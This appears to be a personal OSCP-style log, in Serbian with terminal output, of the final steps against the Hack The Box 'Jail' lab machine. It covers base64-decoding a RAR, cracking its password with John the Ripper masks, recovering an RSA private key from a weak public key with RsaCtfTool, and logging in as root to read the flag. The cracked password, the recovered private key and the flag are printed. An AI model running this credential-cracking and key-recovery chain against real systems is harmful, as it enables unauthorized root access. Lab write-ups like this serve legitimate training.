+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ base64 -d keys.rar.b64 > keys.rar
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ md5sum keys.rar
+fe1be58a625240622d4a51d245b8a886  keys.rar
+
+#md5 hash identican
+bash-4.2$ md5sum keys.rar 
+fe1be58a625240622d4a51d245b8a886  keys.rar
+
+#rar3john je deo JohnTheRipper alata 
+#https://github.com/magnumripper/JohnTheRipper
+rar2john utility for RAR 3.x files, written in 2011 by Dhiru Kholia for GSoC.
+rar2john processes input RAR files into a format suitable for use with JtR.
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ rar2john keys.rar
+! file name: rootauthorizedsshkey.pub
+keys.rar:$RAR3$*1*723eaa0f90898667*eeb44b5b*384*451*1*a4ef3a3b7fab5f8ea48bd08c77bfaa082d3da7dc432f9805f1683073b9992bdc24893a6f5cee2f9a6339d1b6ab155262e798c3de5f49f2f6abe623026fcf8bae99f67bbf6b5c52b392d049d9edff7122d46514afdf7710164dbef5be373c30e3503e8843a1556e373bdaccbaffc6ccbbb93c318b49585447b0b4f02178b464caddfefc9d545abbbd08943d86edec7d12b1c5d8e1cac47fd6a79fd890ca5e95d37e2d96e319f5543a0e6917939dde9126dbdff0a4e7fd616fdaa3d91a414143535bbd1f4086c35e370ea7ea8a7ab97c71fa43768ec90d165b98906e61de7380510048a1eb7b0deca6a43f819acd3ba9bf56f23f6546ba0d39aa860b8760a0bcdfc73d273cc3996e7675a7ae3cc66d753cf6074127cf9781755d972dba1fc7a640de7218728e8324cbd4f4dc4e7da2e09d38ff256455020523a0481051d732583116a03621f8045b01f1beab2a91845f2e8e052a61635b5d8f05c4cb2b4cf75c586cfcdf8f0e66c3161fd352e52f3f29e2281995356217e93ffeaca388a15829d6*33:1::rootauthorizedsshkey.pub 
+
+#hashcat ne podrzava ovaj hash
+
+
+#### hashcat koristi GPU, sto predstavlja problem kada je Kali VM
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ hashcat -b
+hashcat (v5.1.0) starting in benchmark mode...
+
+Benchmarking uses hand-optimized kernel code by default.
+You can use it in your cracking session by setting the -O option.
+Note: Using optimized kernel code limits the maximum supported password length.
+To disable the optimized kernel code in benchmark mode, use the -w option.
+
+* Device #1: This device's constant buffer size is too small.
+
+* Device #1: This device's local mem size is too small.
+
+* Device #1: Not a native Intel OpenCL runtime. Expect massive speed loss.
+             You can use --force to override, but do not report related errors.
+No devices found/left.
+
+# ovo bi trebalo da pomogne, ne pomaze, moram da instaliram Intel OpenCL drajvere, itd., itd.
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ sudo apt-get install pocl-opencl-icd
+
+####Hashcat instaliran na fizickoj masini, bolje performanse i ne moram da se zezam sa Intel drajverima na VM-u
+
+ --stdout 
+ Do not crack a hash, instead print candidates only
+
+#generisemowordlistu sa hashcat-om
+
+Ne generisemo nista, AMD i hashcat jednostavno ne saradjuju
+pokusao sam da naterma hashcat da radi u Windowsu ali se to pretvorilo u katastrofu
+Plus Kali i hashcat je takodje katastrofa
+jebo me Radeon
+
+
+#### koristim JohnTheRipper mask mode
+https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/doc/MASK
+Mask mode is a fast way to produce password candidates given a "mask" that
+describes what the words should look like.
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ john -mask=Morris19?d?d?s jail.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (rar, RAR3 [SHA1 128/128 AVX 4x AES])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+
+Morris1962!           <- password za rar fajl    
+
+(keys.rar)
+1g 0:00:00:04 DONE (2019-07-07 14:54) 0.2487g/s 103.4p/s 103.4c/s 103.4C/s Morris1961!..Morris1980*
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ unrar x keys.rar 
+
+UNRAR 5.61 beta 1 freeware      Copyright (c) 1993-2018 Alexander Roshal
+
+
+Extracting from keys.rar
+
+Enter password (will not be echoed) for rootauthorizedsshkey.pub: 
+
+Extracting  rootauthorizedsshkey.pub                                  OK 
+All OK
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ ls
+ exploit.py   fileperm.c                           http     jail.hash   jail.txt     keys.rar       linenum.txt-06-07-19   rootauthorizedsshkey.pub
+ ex.py       'HackTheBox - Jail-80-73OYcrrk.mp4'   jail.c   Jail.pdf    jail.words   keys.rar.b64   linuxprivchecker.txt
+
+#### root ssh kljuc
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ cat rootauthorizedsshkey.pub 
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
+YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
+DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
+D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
+Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
+I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
+a99GCw==
+-----END PUBLIC KEY-----
+
+
+#### RsaCtfTool
+     RSA attack tool (mainly for ctf) - retreive private key from weak public key and/or uncipher data
+    https://github.com/Ganapati/RsaCtfTool
+
+
+#virtualenv pravi probleme, instalirao sam ga na sistem
+Ubuntu 18.04 and Kali specific Instructions
+git clone https://github.com/Ganapati/RsaCtfTool.git
+cd RsaCtfTool
+sudo apt-get install libgmp3-dev libmpc-dev
+python3 -m venv .
+. bin/activate
+pip install -r "requirements.txt"
+./RsaCtfTool.py
+
+
+kangus7@kali:/opt/RsaCtfTool$ ./RsaCtfTool.py 
+usage: RsaCtfTool.py [-h] [--publickey PUBLICKEY] [--createpub] [--dumpkey]
+                     [--ext] [--uncipherfile UNCIPHERFILE]
+                     [--uncipher UNCIPHER] [--verbose] [--private]
+                     [--ecmdigits ECMDIGITS] [-n N] [-p P] [-q Q] [-e E]
+                     [--key KEY]
+                     [--attack {hastads,prime_n,factordb,pastctfprimes,mersenne_primes,noveltyprimes,smallq,wiener,comfact_cn,primefac,fermat,siqs,Pollard_p_1,londahl,all}]
+
+RSA CTF Tool
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --publickey PUBLICKEY
+                        public key file. You can use wildcards for multiple
+                        keys.
+  --createpub           Take n and e from cli and just print a public key then
+                        exit
+  --dumpkey             Just dump the RSA variables from a key - n,e,d,p,q
+  --ext                 Extended dump of RSA private variables in --dumpkey
+                        mode - dp,dq,pinv,qinv).
+  --uncipherfile UNCIPHERFILE
+                        uncipher a file
+  --uncipher UNCIPHER   uncipher a cipher
+  --verbose             verbose mode (display n, e, p and q)
+  --private             Display private key if recovered
+  --ecmdigits ECMDIGITS
+                        Optionally an estimate as to how long one of the
+                        primes is for ECM method
+  -n N                  Specify the modulus. format : int or 0xhex
+  -p P                  Specify the first prime number. format : int or 0xhex
+  -q Q                  Specify the second prime number. format : int or 0xhex
+  -e E                  Specify the public exponent. format : int or 0xhex
+  --key KEY             Specify the input key file in --dumpkey mode.
+  --attack {hastads,prime_n,factordb,pastctfprimes,mersenne_primes,noveltyprimes,smallq,wiener,comfact_cn,primefac,fermat,siqs,Pollard_p_1,londahl,all}
+                        Specify the attack mode.
+
+
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ /opt/RsaCtfTool/RsaCtfTool.py --publickey rootauthorizedsshkey.pub --private --verbose
+[*] Performing hastads attack.
+[*] Performing prime_n attack.
+[*] Performing factordb attack.
+[*] Performing pastctfprimes attack.
+[*] Loaded 71 primes
+[*] Performing mersenne_primes attack.
+[*] Performing noveltyprimes attack.
+[*] Performing smallq attack.
+[*] Performing wiener attack.
+-----BEGIN RSA PRIVATE KEY-----
+MIICOgIBAAKBgQYHLL65S3kVbhZ6kJnpf072YPH4Clvxj/41tzMVp/O3PCRVkDK/
+CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//DmcIo1pJGKy8LDrwdpsSjVmvSgg3
+9nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6PdD/qlaFM8B87MHZlW1fqe6QKBgQVY
+7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/wWt2/7A1Xgi5ckTFMG5EXhfv67GfC
+FE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAxI85LArqOGc6QoVPS7jx5h5bK/3Oq
+m3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFuga99GCwIgCMdb8cTpq+uOUyIK2Jrg
+PNxrCGF8HNhw8qT9jCez3aMCQQHBKGne1ibAwbqvPTd91cBUKfFYYIAY9a6/Iy56
+XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
+NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
+bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
+6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
+hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
+-----END RSA PRIVATE KEY-----
+
+
+#pCloud mi opet pravi probleme sa file permisijama
+kangus7@kali:~/Desktop$ chmod 600 root-key 
+kangus7@kali:~/Desktop$ ssh -i root-key root@10.10.10.34
+[root@localhost ~]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+
+[root@localhost ~]# cat root.txt 
+f09f2be1a61a9b521d4221bd9dcb29ce
+
+
+
+
+####
+ADDENDUM
+####
+
+
+
+
+
+
+
+
+
+
+
+
